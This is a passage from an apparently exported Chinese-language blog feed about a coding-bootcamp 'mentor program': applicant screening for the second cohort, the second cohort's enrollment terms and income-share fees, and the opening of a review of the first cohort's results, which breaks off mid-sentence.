小時。學程式不是什麼一蹴可幾的事情，速成再速也沒辦法速到你一週只花個 10 小時然後學四個月就飛上天當軟體工程師（有可能啦，但你資質要很不錯）。</p><p>所以如果時間安排看起來很不 ok 的話，也是直接刷掉沒什麼好說的。而待業中的人錄取機率會比較高一點，因為可以利用的時間很多。</p><p>接著我開始把報名的人分成幾種，一種是錄取，另一種是淘汰，還有一種是待定，就是我決定不了到底要錄取還是淘汰，就先放著晚點再回來看。</p><p>這之中還有一群人我有特別挑出來，學生。</p><h3 id="從學生的報名反思計畫的初衷"><a href="#從學生的報名反思計畫的初衷" class="headerlink" title="從學生的報名反思計畫的初衷"></a>從學生的報名反思計畫的初衷</h3><p>我在簡章上面就寫了，基本上不開放學生報名，因為我沒辦法衡量計畫的成效。但還是有一些學生寄信過來，而許多也在信中提出了替代方案（例如說找實習、接外包等等），問說能不能以替代方案來解決衡量成效的問題。</p><p>因為那些學生的信真的很有誠意，我差點想說要不要乾脆學生全收只是收費方式改變，改成像工程師加強班那樣收固定金額，這樣沒有衡量成效的問題，我也可以賺到一些錢。</p><p>Wait wait wait，不對欸！</p><p>差點就忘記自己開這個課的初衷是什麼了。來，再讓我們回顧一遍到底我為什麼要開這個課，我們打開第一期的招生文章，裡面開門見山寫了我想做的事情：</p><blockquote><p><em>我想把一個毫無基礎的人，帶到能成為軟體工程師並且找到工作。</em></p></blockquote><p>為什麼想這樣做的理由那篇文章裡面似乎沒有寫得很清楚，背後的理由是：</p><blockquote><p>我想試圖證明我的教學方式是有效的，而且比其他人有效</p></blockquote><p>所以這個課程不是為了賺錢（是的話我一個人直接收 5 萬塊然後不保證成效，我就四個月賺百萬了），也不是為了什麼助人為快樂之本，而是為了自我實現，是我想證明自己的能力。</p><p>而這最根本的原因也解釋了為什麼我的學生一定要去求職，因為衡量教學成效最直接的方法就是把學生丟到市場上，如果真的有公司願意收這個零基礎轉職的人，就代表我的課程奏效了，真的讓一個人在四個月後變成有人要的工程師，也證明了我的教學方法是有效的。</p><p>一旦收了學生，就完全跟這個初衷脫節了。找實習、接外包的強度都比不上出去外面求職。這無關乎於學生是否有誠意、是否願意付出時間，而是關乎於我這個計畫的目標。</p><p>第一屆會收學生是因為人少，我還負荷得來，所以驗證成效就交給其他人，教學生只是興趣而已，可是這一屆人數變多了，情況不同了。資源有限，我沒辦法同時兼顧到這麼多人。</p><p>所以很抱歉，要跟所有來申請的學生說聲不好意思，必須把你們全部刷掉。我對於你們明知道我基本上不收學生還寄信過來給予高度肯定，其中也有一些人我對你們印象深刻，但因為學生這個身份與這個計畫的目標有衝突，所以只好全部刷掉。</p><p>那以後有機會嗎？有。</p><p>假如這期計畫順利的話，線上課程跟直播都可以之後再利用，我需要參與的時間就會越來越少，整個計畫可以變成半自動化，到那個時候就可以收更多人了，就算是收學生也沒問題。</p><h3 id="最後的抉擇"><a href="#最後的抉擇" class="headerlink" title="最後的抉擇"></a>最後的抉擇</h3><p>在看這些報名信的時候，寫得比較好的的確會比較吸引我。然後我想起一件事情，那就是第一期的時候也有些報名信寫得不錯的，可是到後來一樣沒有跟完。</p><p>於是我就回去找第一期的報名信，想看看最後有跟完課程的人的報名信都長怎樣，結果發現也不怎麼樣，就是寫得很普通。所以說，可能有些人只是不擅長表達出來，但其實是有能力的。</p><p>可是這我怎麼會知道呢？我不會知道，除非我把他收進來讓他用行動去證明這件事情。</p><p>在經過第一輪篩選之後，工程師加強班錄取 3 人，一般的班級錄取 28 人，有 4 個人被我放在待定區裡面，暫時無法決定去留。</p><p>接著我重新看了一遍淘汰區，確認自己沒有淘汰錯任何人，而就在第二次 review 的時候，覺得其中有兩個人其實還 ok，就把他們移回待定區，有一個仔細想了想之後，直接從淘汰區移到錄取區。</p><p>於是狀況就變成：已錄取 32 人、待定區 6 人。</p><p>最後就是在思考到底要從這 6 人當中錄取幾人，還是乾脆全部都淘汰？</p><p>我苦惱了一個晚上，後來想說既然我都苦惱這麼久了，就代表是一個困難的決定。苦惱的點就在於多收 6 個人我的負荷就又更重，可是如果不收這 6 個人，我可能會有一點後悔，因為從他們的報名表裡面可以看出他們應該有機會可以跟完。</p><p>最後，我選擇了我最擅長的那個決定：</p><blockquote><p>那就全收吧！</p></blockquote><h3 id="一些對報名表的小建議"><a href="#一些對報名表的小建議" class="headerlink" title="一些對報名表的小建議"></a>一些對報名表的小建議</h3><p>有些東西我以為很基本，但似乎滿多人不太在意。我也不是很在意這個啦，只是你以後出去求職的時候就會有人在意了，例如說：</p><ol><li>盡可能不要有錯字。</li><li>如果你要附檔案，不要附 doc 或 docx，最好是附上 pdf 檔，或兩個都附也行。</li><li>按照上面寫的附資料，我說我要的是：「codewar 帳號」，有人連密碼一起給我，還有人把題目寫在其他地方交給我而不是寫在 codewar 上面。</li><li>排版不要求什麼，看起來舒服就好。</li><li>但如果你有按照<a href="https://github.com/sparanoid/chinese-copywriting-guidelines">中文排版指南</a>來排版，大加分。</li></ol><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>沒有錄取的人也不用太灰心，不是因為你不夠好，只是你跟這個計畫目前還不適合。我的計畫目標是從零到一把一個人培養成工程師，所以你要有足夠時間，然後最好沒有任何背景。</p><p>這一點跟其他的課程不太一樣，其他課程看到念資工系或是相關科系的可能會優先收進來，因為求職錄取的機率大很多嘛，可是我不會這樣做。要挑戰就要挑戰難的，把一個資工系學生培養成找得到工作的工程師，這哪有什麼厲害的，把一個完全沒碰過程式的人培養成工程師才叫做有能力。</p><p>因此，如果你有相關背景的話反而優先順序會被我往後調一點，在其他人眼裡看來加分的履歷在我這裡不會加分，有可能還扣了一點分。所以我才說沒錄取也不用灰心，有可能代表我覺得你已經有能力成為工程師了，不太需要我的幫忙。</p><p>總之，最後錄取工程師加強班 3 人，基礎班 35 人，一共 38 人。</p><p>被錄取的也不用高興的太早，這次計畫是有淘汰制的，我很期待最後的結果，很好奇會有多少人能跟到最後。</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程式導師實驗計畫第二期報名簡章</title>
      <link href="/2018/07/12/mentor-program-s2-f876c4e13d3b/"/>
      <url>/2018/07/12/mentor-program-s2-f876c4e13d3b/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/mentor-program-s2-f876c4e13d3b/0__zS9ldrKDTqtmtVR8.jpg"></p><p>如果你不知道什麼是程式導師實驗計畫，請先看這篇，裡面有附第一期的介紹跟檢討：<a href="/2018/06/26/mentor-program-review-a9c6668dfb/">程式導師實驗計畫第一期成果與心得</a></p><p>自我介紹的部分在第一期的文章裡面都有了，在這邊我就稍微提一下就好，想看完整經歷的話第一期都有。</p><p>大家好，我是胡立，一個樂於分享、喜歡教學，想不斷改進自己的教學方式並且幫助初學者的人。寫程式經驗十年以上，工作經歷三年，目前在新加坡某間新創擔任 Front-end team lead。</p><h3 id="計劃詳情"><a href="#計劃詳情" class="headerlink" title="計劃詳情"></a>計劃詳情</h3><p>這個計畫很簡單，目標就是：</p><blockquote><p><em>四個月內，把你培養成一個找得到工作的網頁工程師（前端或後端）</em></p></blockquote><p>四個月過後，你可以學到以下東西：</p><p>1. 基本 Git 操作<br>2. 基本 command line 操作<br>3. 前端基礎（HTML, CSS, JavaScript）<br>4. 前端各種工具運用及原理（jQuery, SCSS, Gulp, Webpack）<br>5. 前端進階（React, Redux）<br>6. 後端基礎（PHP, Node.js, MySQL）<br>7. 後端框架（CodeIgniter, Express）<br>8. 基本網路安全（XSS, SQL Injection, CSRF, 密碼不能存明碼）<br>9. 部署（買 domain, 設定 DNS, 租 Digital Ocean 主機, 自己架環境）</p><p>東西很多，所以你要付出的時間也會很多，這不是什麼一兩週的速成班，而是要你紮紮實實每週付出 40 個小時（或更多）才能得到的結果。</p><p>這是第二期了，如果想看第一期的成果在開頭那一篇有，12 個人裡面有 3 個人順利結業（從頭到尾跟完課程），2 個人找到工作，另外那一個因為剛畢業在等兵單所以不方便求職。</p><p>在教學的部份因為我本身是前端工程師，所以會比較著重在前端，但這教學基本上是前後併重，所以後端的部分也不少，只是不會教到很進階就是了。</p><p>（如果你想看第一期的詳細課綱：<a href="https://github.com/Lidemy/mentor-program">點我，我帶你去</a>）</p><h3 id="教學方式"><a href="#教學方式" class="headerlink" title="教學方式"></a>教學方式</h3><p>在第一期的檢討裡面我說過我覺得最理想的教學方式是：「直播講脈絡 + 線上課程講細節」，先用直播跟你講大方向跟概念，剩下的細節跟實作再讓大家自己去看線上課程。第二期的課程會以這個目標為方向，所以在開課之前我也要從零到一自己錄好一大堆的線上課程（這些線上課程對學生會是免費的，不用額外付費）。</p><p>這一期目前規劃是每週一樣直播三次，每次大約為半小時到一個半小時，依據那週的課程複雜程度而定。第一次講大方向、第二次額外補充加講作業內容、第三次檢討作業。<strong>由於第一期的直播都有錄下來，再這邊要先跟大家強調如果這些直播可以重複利用的話，我會直接重複利用。我還是會直播，但可能有部分直播會取消，改為直接給同學們看影片。</strong></p><p>除了直播跟提供線上課程以外，「任何時候」你都可以問問題，然後每一次直播都會存檔。意思就是就算你錯過了直播，你也可以事後再透過影片補回來，不用擔心錯過就一輩子錯過了。</p><p>而且儘管有了直播，在直播外的時間你還是可以問問題。不怕你問，只怕你不問。只要有問題你隨時都可以問，白天我在上班可能不太方便回答你，但晚上的話基本上都 ok，所以你有問題絕對找得到人回答。</p><p>接著我開頭有提過了，這個課程會非常重，需要你一個禮拜大概 40 小時的時間，如果你現在在職然後想轉職，那你必須每天下班以及假日都付出一定的時間。</p><h3 id="收費方式與課程制度"><a href="#收費方式與課程制度" class="headerlink" title="收費方式與課程制度"></a>收費方式與課程制度</h3><p><strong>（第二期的計畫在課程進行方式與收費上有很大的不同，請務必詳細閱讀）</strong></p><p>這次最大的不同在於：<strong>淘汰制</strong>。我會根據每個人報名時填的資料跟我覺得能負荷的人數進行第一輪篩選，目前我也不能跟你保證一開始進來的會有多少人，但應該會比上一期多就是了（上一期收了 13 人）。</p><p>而進來以後，<strong>每兩週篩一次人</strong>，被篩掉的人就掰掰了，就被迫離開這個計畫，要再進來只能等下一期。但也不用太擔心，篩選的標準不是能力，而是你所付出的時間。</p><p>同時滿足下面兩個條件就會被淘汰：</p><ol><li>兩週內每日進度報告累積缺交三次（假日除外，就簡單講一下自己昨天做什麼、今天要做什麼）</li><li>連續兩週未交作業</li></ol><p>所以就算你進度跟不上、作業交不出來，只要每日進度報告讓我看到你還是有在學東西，就不會被淘汰。</p><p>淘汰制的目的是為了讓大家知道「<strong>我要你每週都能付出 40 小時以上</strong>」這句話不是隨口講講的，而是要確實能夠做到這樣。你能拿出一定時間的話，就算跟不上我也會讓你繼續待著；但如果你拿不出來，很抱歉，我必須把你淘汰掉。（如果你事前就有一些規劃可以先找我討論，例如說已經排好要出國旅遊兩週或是要去當補充兵之類的）</p><p>而這次的收費方式也為了因應新的課程制度，有了很大的變動。收費方式為：</p><blockquote><p>開課後一個月內不用付任何錢，當開課滿一個月後決定要繼續上課的話，請付 3000 元新台幣保證金，之後若被淘汰掉錢也不會退給你。</p></blockquote><blockquote><p>在結業後兩個月內找到工作的話，學費總額是一個半月的薪水；沒找到工作的話費用全免，我連 3000  塊一起退給你。</p></blockquote><p>簡單來說有分成幾種情況：</p><ol><li>上了一個月發現課程很爛不想上 &#x3D;&gt; 無損失</li><li>上了一個月繳了 3000 元後來被淘汰 &#x3D;&gt; 損失新台幣 3000 元</li><li>跟完課程找到工作 &#x3D;&gt; 一個半月薪水（跟第一期比起來漲價了）</li><li>跟完課程沒找到工作 &#x3D;&gt; 無損失</li></ol><p>（這邊<strong>薪水</strong>的計算方式跟第一期一樣，會以<strong>你拿到的最高薪水的 offer 為主</strong>，例如說你拿到 30k 跟 40k 兩個 offer，最後去 30k 的，學費依然是收 40k*1.5 &#x3D; 60k）</p><p>另外，已經是工程師卻還是想從零開始來加強基礎的朋友們也歡迎報名，但是不會再幫你額外設計課程，大家都是用同一套，而收費方式變成是：</p><blockquote><p>開課後一個月內不用付任何錢，當開課滿一個月後決定要繼續上課的話，請付 3000 元保證金，之後若被淘汰掉錢也不會退給你。（這邊都一樣）</p></blockquote><blockquote><p>在上課滿兩個月時如果還想繼續上，請付新台幣三萬元，接下來就沒有淘汰制度了，但你覺得課程不滿意想退出也不能退費。</p></blockquote><p>前半段都跟零基礎班的一樣，一個月內不用付錢、一個月時繳不會退還的 3000 保證金，上了兩個月如果還想上，再額外付三萬元（因此學費總和為 33000 元），接著工程師加強班就不會淘汰人了，但之後的課程若不滿意也無法退費。</p><p>接著說明一下為什麼這次的收費模式調整成這樣。</p><p>首先，我想先跟大家講一點我對於學費的看法。有些人心中可能都有想過：</p><blockquote><p>有些課程收幾萬塊根本就是坑錢吧，人家 udemy 一堂課才賣 300 塊，再怎麼買也買不到萬，這些老師根本爽賺。</p></blockquote><p>對我來說，我對學費的看法很簡單，這就是個買賣，是個契約關係，只要它是公平的沒有隱滿任何資訊，然後雙方又都可以接受這個價錢，那就沒有任何問題。</p><p>舉例來說，如果你今天去吃墾丁滷味然後招牌上沒寫價錢，你問老闆他只說：「就跟一般的價錢差不多啦」，而你吃完之後發現一盤豆干要五百塊（假設平均價格只要五十），那你可以說這間店坑錢，因為資訊不對稱，老闆刻意隱滿了價格資訊誤導你。</p><p>但若是今天這間滷味店價目表就已經寫給你看了，上面就寫說：「一盤豆干五百塊，不保證很好吃」，然後你接受了這個價錢也點了，最後發現豆干普普通通，你可以說：「這豆干不值得這個價錢」，但你不能說老闆騙錢，因為是你自己要點的，而老闆也沒說這豆干很好吃，而且你點餐的時候就已經知道是五百塊了，老闆何來的「騙」？。</p><p>再把這個例子往下推，假設今天滷味店價目表寫了一盤豆干五百塊並且提供試吃，而你試吃之後決定買了，一旦你決定買了，之後就沒有任何的問題，因為第一你已經知道價格，第二你已經試吃過了，老闆已經把所有的資訊都揭露給你，而你也同意了五百塊這個價格，那就是你情我願，沒有任何問題。</p><p>其實這就像是簽合約一樣，所有條款詳細都列在上面了，如果你是在神智清楚的情況下自願簽了這份沒有違反任何善良風俗的合約，就代表你自己同意了，之後就要自己承擔責任。</p><p>我想做到的就是最後一個例子，所以我一開始就說明了我收費的標準是：「你有找到工作」才收費，否則不收任何學費（3000 塊保證金如果你有跟完課程是拿得回來的，等於沒有付任何錢）。我把收費標準清楚的公開了，也讓你有試上課程的機會。你一旦報名了，就代表你同意這個收費規則。如果你跟完課程還找不到工作，我一毛都不會拿；但如果你順利找到了，該拿的我也不會少拿。</p><p>這次的學費漲價成一個半月的薪水，以出來後預計能拿到的月薪 30k~40k 來說，學費就是 4.5 萬 ~ 6 萬，這個學費其實比你去上其他的那種 full time 程式培訓班還便宜一些，換算成百分比的話大概是年薪的 13% 左右。</p><p>再次重申，如果你覺得這樣的學費太貴沒辦法接受，那請不要報名。如果你覺得可以接受但課程要有一定品質，那當然歡迎你報名來試試看，因為你如果跟完課沒找到工作我是不收費的；若是你成功找到了，那就證明了我的課程有一定的品質在。</p><p>至於那 3000 塊保證金，其實原本是沒有想要收的，但後來還是覺得收一下比較好，付了錢你才知道你是有花錢來上這個課的，如果你被淘汰了，那你必須為你的懶惰付出代價。</p><p>科技島讀的主筆周欽華曾經在<a href="https://www.facebook.com/chouchinhua/posts/10154555582056697">個人臉書</a>上談論過訂閱制，他說：「訂閱的真正意義是「我找到你了，我不要每次都要重新尋找了，請你專心為我服務吧」。」</p><p>我對這個計畫的期許也很類似：</p><blockquote><p>不要再去尋找那些如何成為工程師的資源了，不要再去問人有沒有推薦的課程了，只要來這裡讓我帶著你，我就想辦法讓你變成工程師。</p></blockquote><h3 id="報名資格"><a href="#報名資格" class="headerlink" title="報名資格"></a>報名資格</h3><ol><li>一個禮拜可以拿出 40 個小時左右的人（不然你很有可能會被淘汰）</li><li>想要轉職成工程師的人（如果只是想學一些程式技能，沒有想要找工作的話不開放報名）</li><li>結業後有求職意願的人（基本上不開放學生報名，因為學生結業之後可能礙於兵役或是要繼續升學而不會去求職，會讓我沒辦法衡量計畫的成效，但如果你確定你結業後可以去求職，那 ok）</li></ol><h3 id="計畫時程表"><a href="#計畫時程表" class="headerlink" title="計畫時程表"></a>計畫時程表</h3><p>報名日期：即日起至 <strong>2018&#x2F;08&#x2F;13 晚上 11:59 分（一）<br>*報名已截止</strong>報名結果公告：2018&#x2F;08&#x2F;20（一）<br>開課日期：2018&#x2F;09&#x2F;03（一）<br>繳交保證金新台幣 3000 元（一個月）：2018&#x2F;10&#x2F;03（三）<br>繳交學費 30000 元（兩個月，工程師加強班才有的）：2018&#x2F;11&#x2F;03（六）<br>結業日期：2019&#x2F;01&#x2F;14（一）<br>求職截止日（在這時間點前找到工作都必須付學費）：2019&#x2F;03&#x2F;14（六）</p><p>（總時長比四個月多了約 10 天，因為中間有一些國定假日外加幫自己留一些休假時間）</p><h3 id="報名方式（報名已截止）"><a href="#報名方式（報名已截止）" class="headerlink" title="報名方式（報名已截止）"></a>報名方式（報名已截止）</h3><ol><li>填寫 <a href="https://goo.gl/forms/LVulgeG6513D17ny2">Google 表單</a>（一些基本資料）</li><li>去研究什麼是 <a href="https://scratch.mit.edu/">Scratch</a>，並且做出一個小作品，只要是任何你覺得完整的作品就好，沒有 idea 的話可以參考 <a href="https://youtu.be/y62zj9ozPOM?t=50m21s">CS50</a>。這個只是想測驗你有基本的自學能力而已，所以不用做得太複雜（不用有關卡）</li><li>Codewar 是一個程式解題的平台，請參考<a href="https://github.com/Lidemy/mentor-program/blob/master/codewar.md">這篇</a>並解出這篇裡面任意五個題目，解完以後請寫一篇解題的心得（例如說如何從什麼都不會到了解什麼是迴圈，或者是解題的時候卡關的地方等等）</li></ol><p>（上一期沒有任何程式基礎也能報名，但根據前人的經驗，上課會上的很趕很趕，所以這一期希望你在報名前自己先預習很基礎的程式知識，更深的我上課會教。如果你毫無程式基礎，可參考 <a href="https://www.codecademy.com/">codecademy</a> 或任何網站先預習 JavaScript）</p><p>上面三個都做完之後，請寫信到：<a href="mailto:&#97;&#x73;&#x7a;&#x78;&#x38;&#x37;&#52;&#x31;&#48;&#x40;&#103;&#109;&#97;&#x69;&#x6c;&#46;&#x63;&#111;&#x6d;">&#97;&#x73;&#x7a;&#x78;&#x38;&#x37;&#52;&#x31;&#48;&#x40;&#103;&#109;&#97;&#x69;&#x6c;&#46;&#x63;&#111;&#x6d;</a><br>標題請打：[報名] 程式導師實驗計畫第二期— huli<br>（請把 huli 換成你自己的暱稱）</p><p>內文麻煩附上：</p><ol><li>自我介紹（讓我更瞭解你）</li><li>報名這個計畫的理由</li><li>若成功錄取之後，你的時間安排為何（例如說目前待業，每天都有 8 小時可以寫程式；或是目前在職，但是晚上七點到十點會自學等等）</li><li>你未來想做什麼？（回答前請參考<a href="https://www.facebook.com/chouchinhua/posts/10155380530346697">這一篇</a>）</li><li>Scratch 作品連結</li><li>做完 Scratch 作品的心得</li><li>Codewar 帳號</li><li>解 Codewar 題目的心得</li><li>任何你想跟我分享的東西（例如說你寫的小說、你畫的圖、你的一篇廢文等等。）</li><li>目前的工作內容、狀況以及在工作上碰到的困難（工程師加強班才需要回答）</li></ol><p>收到信件之後我會回覆一個罐頭回信，讓你知道我有收到了。<strong>請記得，Google 表單填完跟寄信之後才算是報名成功，兩者缺一不可。</strong></p><p>報名結果公告那天（2018&#x2F;08&#x2F;20），無論有沒有錄取你都會收到信件，絕對不會有無聲卡的情形發生。</p><p>總而言之，我會讓你知道我收到報名信了，也會讓你知道你有沒有錄取。（但是沒錄取的通知信有可能是罐頭信件就是了，不好意思）</p><h3 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h3><ol><li>如果已經在工作的，可以報名嗎？</li></ol><p>可以，但不建議。</p><p>再重申一次，這個班級的目的是想要從零開始培養出「找得到工作的工程師」，既然你已經找得到工作了，就代表無論強或弱，你都是有一定實力的，因此這個班級教的東西對你來說可能會太簡單。</p><p>但如果你看完課程大綱依舊想要報名，就代表你認為這個課程依舊對你有幫助，那我也歡迎你來這邊把你的基礎打得更穩。不過課程收費方式會變得不一樣，上面有講解對於已經有工作的人的收費方式。</p><p>2. 如果直播的時間跟不到怎麼辦？</p><p>這很正常，我自己有時候也會因為私人的事情會調整直播時間，但我每次的直播「一定都會存檔」，所以不用擔心直播沒跟到就漏掉一堂課，我能保證你一定會有直播時錄的影片可以看。</p><p>3. 如果課程時間無法配合怎麼辦？</p><p>我能明白大家都有自己的事情要做，或是有些不可抗力的因素，例如有人可能要當兵或是要出國交換等等。如果時間沒辦法配合的，那就建議不要報名了，很多事情一旦中斷之後，要花好幾倍的力氣才能重新堅持下去。</p><p>4. 針對初學者的課程完成後收 4.5 萬起跳，對工程師的只收 3 萬，那初學者可以假扮工程師嗎？</p><p>對工程師的審核條件不太一樣，初學者是裝不來的。就算你在報名的時候裝成功了，如果之後被我發現你不是工程師，我會直接把你踢掉並列入黑名單。</p><p>5. 這一期的時間沒辦法配合，會有下一期嗎？</p><p>不敢保證會有下一期，隨緣吧。</p><p>6. 家裡經濟有困難，結業之後可能沒辦法馬上付出學費怎麼辦？</p><p>這沒問題，學費可以分期付款，如果經濟狀況有問題的話，不會剛找到工作就立刻要你付學費，都可以再商量。</p><p>7. 第一期的業餘班怎麼這期沒有了？</p><p>因為時間忙不過來，只能專注在一套教材跟一種課程，所以業餘班就沒囉</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程式導師實驗計畫第一期成果與心得</title>
      <link href="/2018/06/26/mentor-program-review-a9c6668dfb/"/>
      <url>/2018/06/26/mentor-program-review-a9c6668dfb/</url>
      
        <content type="html"><![CDATA[<p>在觀看此文章之前，如果你不知道什麼是程式導師實驗計畫，請點擊下方連結，但簡單來說就是一個小班教學的程式課程：<a href="/2017/12/21/mentor-program-b5f96ae1eed1/">從零到一：程式導師實驗計畫</a></p><p>其實我自己也忘記這個計畫居然是去年 po 的文了，轉眼間半年過去了，這個計畫也正式告一段落，這篇來跟大家分享一下這半年間的教學心得以及最後的成果。</p><h3 id="從報名開始談起"><a href="#從報名開始談起" class="headerlink" title="從報名開始談起"></a>從報名開始談起</h3><p>總共有 18 個人填寫報名表單，13 個人寄信，其中一人本來就有參加隔壁棚的一個類似的培訓計畫，但聽不太懂進度嚴重落後所以跑來報名我的，後來跟那邊助教聊過之後決定再努力看看，因此最後沒有成功報名。</p><p>剩下的 12 人有一個人報名的是業餘班，我後來直接讓她上正式班了，跟她說妳就按照自己的步調來就好，但一個月後她因為時間因素而主動退出。</p><p>雖然當初文章說預期只收 5 人左右，但後來我把剩下的 11 人全部收進來了，全數錄取，因為我預料應該會有滿多人退出，現在事後諸葛真慶幸自己有全收，不然上到後面大概就要沒學生了哈哈哈哈。</p><p>除了這些人以外，再加上一個我以前課程的學生因為表現良好所以直接被我找進來，但已經有告知我說時間不太確定，中途可能會有其他事情要忙。</p><p>因此，這課程總共有 12 名學生。</p><p>除此之外，我找了一些小幫手，是我的一些朋友們，都是已經有工作的人，前端工程師居多，大概有 5 人左右，我跟他們說如果有空可以幫我回一下學生的問題，或是自己也可以聽課。不過這些小幫手因為要忙自己的事情，所以後期很少出現，很感謝他們初期的參與。</p><p>接著，我不想賣關子，所以我要直接開門見山跟大家說最後的結果如何。下面我將附上 12 個人的大略身份背景以及最後的結果（以下按照年齡排序）：</p><ol><li>男性 大四工院學生，因個人健康問題而退出</li><li>男性 大四文院學生，一個月後因時間無法配合加上沒那麼有興趣而退出</li><li>男性 大四理院學生，順利結業，但礙於兵役問題暫時無法求職</li><li>男性 大五管院學生，三個月後因為去日本當交換學生而退出</li><li>女性 20~25 歲，因為要忙實習而退出</li><li>女性 20~25 歲，freelance，因為要忙自己的案子而退出</li><li>女性 25~30 歲，人在英國，有跟完課程，但還沒完成 final project</li><li>女性 25~30 歲，有跟完課程，剛寫完 final project，正準備求職</li><li>女性 30~35 歲，人在美國，因為要籌備婚禮而退出</li><li>男性 35~40 歲，因家人健康出問題而退出</li><li>男性 35~40 歲，因老婆生小孩而退出</li><li>男性 35~40 歲，順利結業，也順利找到工作</li></ol><p>一共 8 個男生 5 個女生，年齡範圍滿廣的，而最後總共有 3 個人順利結業（結業標準為有跟完課程並且有做出 final project），1 個人順利找到工作。</p><p>結業人數比例為 25%，而成功找到工作的比例為 8%。找到工作的那位學生拿到的 offer 薪水 range 為 35k~40k。</p><p>（2018–07–09 更新：上面講的那個正準備求職的學生也找到工作了，結業的 3 個人中有 2 人順利找到工作）</p><p>下面是其中兩位學生做出來的 final project：</p><ol><li>咖啡豆購物網站 <a href="http://thinkr.tw/coffee-beans/">http://thinkr.tw/coffee-beans/</a></li><li>模仿 sukiya 做出來的網站（React + Redux）<a href="http://tomlee0122.tw/static/sukiya_project/sukiya/index.html#/">http://tomlee0122.tw/static/sukiya_project&#x2F;sukiya&#x2F;index.html#&#x2F;</a></li></ol><h3 id="所以，這計劃成功了嗎？"><a href="#所以，這計劃成功了嗎？" class="headerlink" title="所以，這計劃成功了嗎？"></a>所以，這計劃成功了嗎？</h3><p>先來回顧一下這計畫當初的目標是什麼，是：</p><blockquote><p>四個月內，把你培養成一個找得到工作的網頁工程師（前端或後端）</p></blockquote><p>有人順利找到工作了，所以成功了嗎？</p><p>老實說，我覺得一半一半，不能說完全成功，但也不能說完全失敗。其實我覺得失敗的程度還更高一些。</p><p>為什麼呢？因為最後有找到工作的那位同學，其實已經有一些基礎了，大學時修過 C 語言，而且參加過台大資訊系統訓練班學過 MEAN（MongoDB, Express, Angular, Nodejs）。從第一堂課開始，他的表現就已經超出其他同學許多。</p><p>沒有說特別強，但已經對程式有一定的 sense 了，每次他都是第一個交作業，讓有些真的零基礎的同學都懷疑人生了，跑來問我：「老師，我每次都覺得自己進度太慢」，我回他說：「沒有，不是你的錯，是這個同學進度太快」。</p><p>總之呢，這個同學並不是一個完全沒基礎的人，所以我不會說我的計劃成功了。但我會說我的計劃的確有幫助到這個學生，讓他系統性地去學習 Web 開發相關的知識。</p><h3 id="我們教了什麼？"><a href="#我們教了什麼？" class="headerlink" title="我們教了什麼？"></a><strong>我們教了什麼？</strong></h3><p>這邊有完整的課程大綱跟作業，我把一切東西都開源在網路上了，有人想拿這份東西當教材的話也歡迎使用，但可以的話麻煩告知我一下：<a href="https://github.com/Lidemy/mentor-program">Lidemy&#x2F;mentor-program</a></p><p>簡單講一下，我教了下面這些東西：</p><p>1. 基本 Git 操作（每次交作業都要用發 PR 的方式，遵守 GitHub Flow）<br>2. 基本 command line 操作<br>3. 前端基礎（HTML, CSS, JavaScript, Ajax, Cookie）<br>4. 前端各種工具運用及原理（jQuery, SCSS, Gulp, Webpack）<br>5. 前端進階（React, Redux，學生只懂概念跟基礎，沒有很熟練）<br>6. 後端基礎（PHP, Node.js, MySQL, Session）<br>7. 後端框架（CodeIgniter, Express）<br>8. 基本網路安全（XSS, SQL Injection, CSRF, 密碼不能存明碼）<br>9. 部署（買 domain, 設定 DNS, 租 Digital Ocean 主機, 自己架環境）</p><p>教學方式為每週直播三次，禮拜一、四跟日，前兩次講解本週的課程內容，接著讓大家寫作業，而週日則由我來幫大家檢討作業。中間有什麼問題都能在 slack 上面問。</p><p>交作業方式我上面有提到，要開一個新的 branch 然後在 GitHub 上面發 Pull Request，我會 review 過後幫他 merge（如果我認為 ok 的話）。</p><p>當初在想這份課程大綱的時候，我有稍微考慮到內容的深度以及廣度，還必須考慮到能不能在四個月把上面的東西都教完。最後發現後面 React 那邊有點趕，學生學得不太紮實，我自己也教得不太好，之後改進的空間還很大。</p><p>其他的我倒是覺得還行，進度應該都還可以。接著來談談我覺得自己做的好的地方，從這些做得好的地方，你應該可以看出我的教學方式跟其他人有什麼不同：</p><h3 id="一、把工作上會用到的東西移植到課程中"><a href="#一、把工作上會用到的東西移植到課程中" class="headerlink" title="一、把工作上會用到的東西移植到課程中"></a>一、把工作上會用到的東西移植到課程中</h3><p>在思考教學方式的時候，我想到了工作上其實有些東西可以移植到課程裡。目的就是為了讓學生（在不知情的情況下）提早體驗工作後會有的流程等等，在課程就先讓他們習慣，有種預習的感覺。</p><p>我移植的第一個東西是 stand-up meeting，就是每天早上大家輪流講一下自己昨天跟今天做了哪些事情，以及有沒有什麼工作被 block，需要其他人來解決。blocker 的部分我把它拿掉了，只讓學生每天都報告自己昨天跟今天做了哪些事情。</p><p><img src="/img/mentor-program-review-a9c6668dfb/1____VQg__xclGU__zIFVLj63cAA.png"></p><p>從每天的報告裡面，大致可以抓到學生的進度到哪。除此以外也可以知道學生的活躍度，當你看見某個學生消失一週的時候，就知道他差不多要退出了。</p><p>另外一個例子就是交作業。我出社會工作之後，公司採用的多半是 <a href="https://guides.github.com/introduction/flow/">GitHub flow</a>，簡單來說就是你有新的東西要做，你就一定要開一條新的 branch，送出 Pull Request 審核通過之後才能 merge 回去。</p><p>交作業也是這樣的，我第一堂課就先教 git，跟他們說你交作業一定要按照這個流程：</p><ol><li>開一個新的 branch</li><li>在新的 branch 上面完成作業</li><li>在 GitHub 上面新增一個 Pull Request</li><li>等我 review，通過之後我會幫你 merge</li><li>回到步驟一</li></ol><p>採用這種流程的好處很多，最明顯的就是 (1) 學生一定要會 git 基本操作，以及 (2) 身為老師的我很好做 code review，而且可以很方便的加上意見。</p><p><img src="/img/mentor-program-review-a9c6668dfb/1__BCP__5lGLGcDpVGqIqpeRqg.png"></p><p>除此之外，甚至還可以串上 CI，完成某些作業的自動批改。例如說我第一週也教了一點 unit test，作業是一些簡單的程式基本題目，學生上傳 PR 之後會自動串到 